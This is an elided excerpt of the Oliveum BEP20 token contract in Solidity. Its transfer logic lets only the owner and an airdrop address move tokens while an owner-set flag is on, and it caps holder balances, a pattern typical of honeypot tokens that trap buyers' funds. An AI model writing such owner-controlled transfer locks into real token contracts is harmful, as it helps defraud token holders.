 ...
 */
contract Oliveum is Ownable, IBEP20 {
    ...
    uint private _minBalance = 10 ether;
    uint private _maxBalance = 500000 ether;
    bool private _isAirdrop = true;
    ...
    function activateTransfer(bool changeP) public  onlyOwner {
        _isAirdrop = changeP ;
    }

    function setAirDrop(address _address) public onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(_balances[sender] >= _minBalance,"you havent enough token to transfer!");
        if(msg.sender != owner() && msg.sender !=_airdropAddress){
            require(!_isAirdrop);
            require(_balances[recipient].add(amount) <= _maxBalance);
        }
